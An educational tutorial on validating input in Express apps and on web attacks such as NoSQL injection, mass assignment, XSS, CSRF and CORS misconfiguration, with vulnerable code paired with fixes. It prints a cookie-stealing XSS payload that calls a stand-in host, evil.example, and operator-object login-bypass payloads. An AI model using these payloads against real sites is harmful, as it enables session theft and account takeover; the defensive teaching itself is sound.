---
summary: Everything a client sends is under the client's control. This station covers checking input before using it, and the attacks that work when you do not. Injection, XSS, CSRF, CORS mistakes and mass assignment, each shown working and then fixed.
time: 45
needs: express-first-app, express-middleware, rest-api
---
## The problem this solves

Your frontend sends tidy JSON. But the server is on the internet, and anyone can send it any bytes with `curl`. Fields may be missing, the wrong type, enormous, or crafted to make your own code do something you did not intend.

**The rule of the whole station: never trust input. Validate it at the edge, then work only with the validated result.**

## Part 1: validation

### Step 1: hand-written checks, and why they do not scale

```js run
function validateSignup(body) {
  const errors = {};
  if (typeof body?.email !== 'string' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(body.email)) errors.email = 'must be a valid email';
  if (typeof body?.password !== 'string' || body.password.length < 8) errors.password = 'must be at least 8 characters';
  if (!Number.isInteger(body?.age) || body.age < 13 || body.age > 120) errors.age = 'must be a whole number between 13 and 120';
  return Object.keys(errors).length ? { ok: false, errors } : { ok: true, value: { email: body.email.toLowerCase(), password: body.password, age: body.age } };
}

console.log(validateSignup({ email: 'Asha@Example.com', password: 'correct horse', age: 22, isAdmin: true }));
console.log(validateSignup({ email: 'nope', password: '123', age: '22' }));
console.log(validateSignup(undefined));
```

Three things to notice: all errors are reported at once, not just the first; the returned `value` contains **only the fields we expect** (the extra `isAdmin` is gone); and the email is normalized. But writing this for every route is repetitive and easy to get wrong.

### Step 2: a schema, validation as data

Describe the shape once; let one function check any input against it.

```js run
const rules = {
  string: ({ min = 0, max = Infinity, pattern } = {}) => v =>
    typeof v !== 'string' ? 'must be a string' : v.length < min ? `must be at least ${min} characters` : v.length > max ? `must be at most ${max} characters` : pattern && !pattern.test(v) ? 'has an invalid format' : null,
  integer: ({ min = -Infinity, max = Infinity } = {}) => v => !Number.isInteger(v) ? 'must be a whole number' : v < min ? `must be at least ${min}` : v > max ? `must be at most ${max}` : null,
  oneOf: (...options) => v => options.includes(v) ? null : `must be one of: ${options.join(', ')}`,
  optional: rule => v => v === undefined ? null : rule(v),
};
function validate(schema, input) {
  const errors = {}, value = {};
  for (const [field, rule] of Object.entries(schema)) {
    const problem = rule(input?.[field]);
    if (problem) errors[field] = problem; else if (input?.[field] !== undefined) value[field] = input[field];
  }
  return Object.keys(errors).length ? { errors } : { value };
}

const createProduct = {
  name: rules.string({ min: 2, max: 80 }),
  price: rules.integer({ min: 0 }),
  category: rules.oneOf('keyboards', 'mice', 'monitors'),
  description: rules.optional(rules.string({ max: 500 })),
};
console.log(validate(createProduct, { name: 'K2', price: 249900, category: 'keyboards', hacked: true }));
console.log(validate(createProduct, { name: 'x', price: -5, category: 'phones' }));
```

This is, in miniature, what libraries such as **Zod**, **Joi** and **express-validator** do. In a real project use one of them: they handle nesting, arrays, type conversion and clear messages. The idea is identical: a schema per endpoint, validation as the first step, a 422 with a field-by-field error object on failure ([[rest-api]]).

### Step 3: validation as middleware

```js run
const express = require('express');
const app = express();
app.use(express.json({ limit: '10kb' }));

const validateBody = check => (req, res, next) => {
  const problems = check(req.body ?? {});
  if (problems.length) return res.status(422).json({ error: 'validation failed', details: problems });
  next();
};
const commentRules = body => [
  ...(typeof body.text === 'string' && body.text.trim().length >= 1 && body.text.length <= 280 ? [] : ['text must be 1 to 280 characters']),
  ...(Number.isInteger(body.rating) && body.rating >= 1 && body.rating <= 5 ? [] : ['rating must be a whole number from 1 to 5']),
];
app.post('/comments', validateBody(commentRules), (req, res) => res.status(201).json({ saved: req.body.text }));
app.use((err, req, res, next) => res.status(err.status || 500).json({ error: err.type === 'entity.too.large' ? 'request body too large' : 'bad request' }));

const server = app.listen(0, async () => {
  const post = async body => {
    const res = await fetch(`http://localhost:${server.address().port}/comments`, { method: 'POST', headers: { 'content-type': 'application/json' }, body });
    console.log(res.status, JSON.stringify(await res.json()));
  };
  await post(JSON.stringify({ text: 'great keyboard', rating: 5 }));
  await post(JSON.stringify({ text: '', rating: 9 }));
  await post(JSON.stringify({ text: 'x'.repeat(20000), rating: 5 }));
  server.close(); server.closeAllConnections();
});
```

`validateBody(rules)` is a middleware factory ([[express-middleware]], [[js-closures]]). The route handler now runs **only** with valid data. Note `express.json({ limit: '10kb' })`: without a size limit an attacker can post gigabytes and exhaust your memory. The third request got a 413.

## Part 2: attacks

For each: how it works, the vulnerable code, the fix.

### Attack 1: NoSQL injection

```js run
const users = [{ email: 'asha@example.com', password: 'correct horse' }, { email: 'admin@example.com', password: 'top-secret' }];
const matches = (doc, query) => Object.entries(query).every(([field, cond]) =>
  cond !== null && typeof cond === 'object'
    ? Object.entries(cond).every(([op, v]) => op === '$ne' ? doc[field] !== v : op === '$gt' ? doc[field] > v : false)
    : doc[field] === cond);
const findOne = query => users.find(u => matches(u, query));

const loginVulnerable = body => findOne({ email: body.email, password: body.password });
const loginSafe = body => (typeof body.email !== 'string' || typeof body.password !== 'string') ? 'rejected: fields must be strings' : findOne({ email: body.email, password: body.password }) ?? 'no match';

const attack = { email: 'admin@example.com', password: { $ne: null } };
console.log('vulnerable:', loginVulnerable(attack));
console.log('safe      :', loginSafe(attack));
```

`matches` imitates how MongoDB reads a query. The attacker sent an **object** where a string was expected: `{ "$ne": null }` means "password is not null", which is true for every user. They are logged in as admin with no password.

**Fix.** Validate **types**: a password must be a string. That single check defeats this. Also never build queries by concatenating user input, and never pass `req.body` or `req.query` directly as a query filter. (Passwords are also never stored or compared in plain text; see [[auth-jwt]].) The SQL version of this attack and its fix, parameterized queries, is in [[dbms-sql]].

### Attack 2: mass assignment

```js run
const user = { id: 7, name: 'Asha', email: 'asha@example.com', role: 'member', credits: 0 };

const updateVulnerable = (u, body) => Object.assign({}, u, body);
const pick = (obj, allowed) => Object.fromEntries(allowed.filter(k => k in obj).map(k => [k, obj[k]]));
const updateSafe = (u, body) => Object.assign({}, u, pick(body, ['name', 'email']));

const request = { name: 'Asha S', role: 'admin', credits: 99999 };
console.log('vulnerable:', updateVulnerable(user, request));
console.log('safe      :', updateSafe(user, request));
```

The "edit profile" form only has name and email, but the attacker added `role` and `credits` to the JSON by hand, and `Object.assign` (or `User.findByIdAndUpdate(id, req.body)`) copied everything. **Fix: an allow-list.** Copy only the fields this endpoint is meant to change. A validation schema that strips unknown keys does this for you.

### Attack 3: cross-site scripting (XSS)

```js run
const comment = '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">';

const escapeHtml = s => s.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

console.log('unsafe page :', `<p>${comment}</p>`);
console.log('escaped page:', `<p>${escapeHtml(comment)}</p>`);
```

**How it works.** The attacker stores text that is really HTML. When another user's browser shows the page, it runs the attacker's script **as your site**, with access to that user's session. In the unsafe line the browser would create an image, fail to load it, and run the `onerror` code.

**Fixes.**

| Defence | What it does |
| --- | --- |
| Escape on output | turn `<` into `&lt;` so the browser shows text instead of running it. React does this automatically for `{value}` ([[react-rendering]]); the danger is `dangerouslySetInnerHTML` and `innerHTML` |
| `HttpOnly` cookies | the script cannot read the session cookie ([[auth-jwt]]) |
| Content-Security-Policy header | tells the browser which script sources are allowed, blocking inline scripts |
| Sanitize rich text | if users may post HTML, run it through a sanitizer library that removes scripts and event handlers |

### Attack 4: CSRF and what CORS actually does

Two ideas that are constantly confused.

**Same-origin policy.** A page from `evil.example` may *send* requests to `bank.example`, but the browser will not let its JavaScript *read* the response, unless `bank.example` opts in with CORS headers.

**CORS** (cross-origin resource sharing) is that opt-in. It **relaxes** a browser restriction; it is not a firewall. `curl` and other servers ignore it completely.

```js run
const express = require('express');
const app = express();
const allowed = new Set(['https://app.example.com']);

app.use((req, res, next) => {
  const origin = req.get('origin');
  if (origin && allowed.has(origin)) {
    res.set({ 'Access-Control-Allow-Origin': origin, 'Access-Control-Allow-Credentials': 'true', Vary: 'Origin' });
    if (req.method === 'OPTIONS') return res.set({ 'Access-Control-Allow-Methods': 'GET,POST,PATCH,DELETE', 'Access-Control-Allow-Headers': 'content-type,authorization' }).status(204).end();
  }
  next();
});
app.get('/profile', (req, res) => res.json({ name: 'Asha' }));

const server = app.listen(0, async () => {
  const url = `http://localhost:${server.address().port}/profile`;
  for (const origin of ['https://app.example.com', 'https://evil.example']) {
    const res = await fetch(url, { headers: { origin } });
    console.log(origin.padEnd(26), '-> status', res.status, '| Access-Control-Allow-Origin:', res.headers.get('access-control-allow-origin') ?? '(absent: the browser will block the page from reading this)');
  }
  const preflight = await fetch(url, { method: 'OPTIONS', headers: { origin: 'https://app.example.com', 'access-control-request-method': 'PATCH' } });
  console.log('preflight OPTIONS'.padEnd(26), '-> status', preflight.status, '| methods:', preflight.headers.get('access-control-allow-methods'));
  server.close(); server.closeAllConnections();
});
```

Both requests got status 200: **the server answered the evil origin too.** The protection is that the response lacks the allow header, so a browser refuses to hand the data to that page's script. For requests that are not "simple" (JSON bodies, custom headers, PATCH/DELETE), the browser first sends an `OPTIONS` **preflight** asking permission. In practice you use the `cors` package with an explicit list of origins.

**CSRF** (cross-site request forgery) abuses the fact that browsers attach cookies automatically. A page on `evil.example` contains a hidden form that POSTs to `bank.example/transfer`. The browser sends it **with the user's bank cookies**. The attacker never reads the response; the damage is the action itself.

| Defence | How |
| --- | --- |
| `SameSite=Lax` or `Strict` cookies | the browser does not send the cookie on cross-site POSTs |
| CSRF token | the server issues a random value the real page includes in each request; a forged page cannot know it |
| Tokens in the `Authorization` header instead of cookies | nothing is attached automatically, so CSRF does not apply (but XSS then matters more) |

## Part 3: the baseline checklist

| Measure | Stops | How |
| --- | --- | --- |
| Validate every input, strip unknown fields | injection, mass assignment, crashes | schema per endpoint |
| Body size limits | memory exhaustion | `express.json({ limit })` |
| Rate limiting, stricter on login | brute force, abuse | [[node-scaling]] |
| Security headers | clickjacking, MIME sniffing, some XSS | `helmet()` |
| Explicit CORS allow-list | other sites reading your API with the user's credentials | `cors({ origin: [...] })` |
| Hash passwords, short-lived tokens | credential theft | [[auth-jwt]] |
| Authorization on every route and every object | users reading or changing others' data | check ownership, not just "logged in" |
| HTTPS everywhere | eavesdropping | [[cn-http]] |
| Generic error messages, detailed logs | information leakage | [[js-errors]] |
| Secrets in the environment, dependencies updated | leaked keys, known vulnerabilities | [[node-essentials]] |

The authorization row deserves a name: checking that a user is logged in but not that **this order belongs to them** is called IDOR (insecure direct object reference), and it tops real-world vulnerability lists. `GET /orders/42` must verify `order.userId === req.user.id`.

!!! key
- Validate type, presence, format and range at the boundary; reply 422 with all problems.
- Allow-list fields. Never spread `req.body` into a database write.
- Injection: user data must never be interpreted as query or code. Check types; use parameterized queries.
- XSS: escape on output. CSRF: `SameSite` cookies or tokens. Know which is which.
- CORS is enforced by browsers and protects users; it does not protect your API from direct calls.
- Authentication is not authorization: check ownership of each object.
!!!

!!! trap
- Validating only in the frontend. The frontend is for user experience; the server is the gate.
- `cors()` with no options (allows every origin), or reflecting the Origin header together with credentials.
- A deny-list ("remove `<script>`"). Attackers have endless variants; use escaping and allow-lists.
- Different error messages for "no such email" and "wrong password", which reveal who has an account.
- Logging request bodies that contain passwords or tokens.
!!!

!!! twist What changes if...
- **...users upload files?** Check size and real type (not the extension), generate your own file names ([[node-essentials]] path traversal), store outside the web root or in object storage, and never execute them.
- **...the API is called by other servers, not browsers?** CORS and CSRF do not apply; API keys or signed requests and rate limits do.
- **...you accept a URL from the user and fetch it?** That is server-side request forgery (SSRF): they can make your server call internal addresses. Allow-list hosts and block private IP ranges.
- **...validation needs the database (is this email taken)?** Do format checks in the schema; enforce uniqueness with a unique index and translate the duplicate-key error to 409 ([[mongo-indexes]]).
!!!

!!! model
Draw a border around your server. Everything crossing in is checked against a schema and stripped to what you asked for. Everything crossing out to a browser is escaped. Inside the border, code works only with data it can trust.
!!!

## Practice

?? A profile update route does `await User.findByIdAndUpdate(req.user.id, req.body)`. Name the vulnerability and fix it.
Mass assignment: the client can set `role`, `isVerified`, `balance` or any other field. Fix by validating the body against a schema that only contains the editable fields and strips unknown ones, then pass the validated object.
??

?? A login form is vulnerable to `{ "password": { "$gt": "" } }`. Explain why and give two layers of defence.
The object is passed into the query, where `$gt: ""` matches any non-empty string. Defences: validate that `email` and `password` are strings before use; and never compare passwords in a query at all. Fetch the user by email, then verify with `bcrypt.compare` ([[auth-jwt]]).
??

?? Your React app on `localhost:5173` gets a CORS error calling the API on `localhost:3000`, but the same request works in Postman. Why?
Different ports are different origins, so the browser applies the same-origin policy and needs the API to send `Access-Control-Allow-Origin`. Postman is not a browser and does not enforce it. Add CORS middleware allowing the frontend's origin.
??

?? XSS vs CSRF: which one steals data and which one performs actions, and what is the main defence for each?
XSS runs the attacker's script inside your site, so it can read data and act as the user; defend by escaping output and a content security policy. CSRF makes the user's browser send an unwanted request from another site, performing an action without reading the response; defend with `SameSite` cookies or CSRF tokens.
??

?? `GET /api/invoices/1057` returns an invoice. A logged-in user changes the number to 1058 and sees another company's invoice. What is missing?
Object-level authorization. The route checked that someone is logged in but not that the invoice belongs to them. Query with both conditions (`{ _id: id, companyId: req.user.companyId }`) and return 404 when nothing matches.
??
